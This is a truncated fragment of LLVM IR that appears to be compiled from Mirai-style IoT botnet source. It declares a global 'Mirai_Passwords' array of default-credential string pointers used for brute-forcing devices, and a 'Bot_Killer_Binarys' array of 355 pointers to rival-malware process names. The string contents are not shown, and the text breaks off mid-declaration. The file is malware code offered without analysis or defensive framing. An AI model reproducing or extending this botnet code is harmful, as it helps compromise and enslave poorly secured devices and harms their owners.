@Mirai_Passwords = local_unnamed_addr global [35 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0)], align 16
@Bot_Killer_Binarys = global [355 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.302, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.303, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.306, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.307, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.308, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.313, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.386, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.387, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.388, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.389, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x 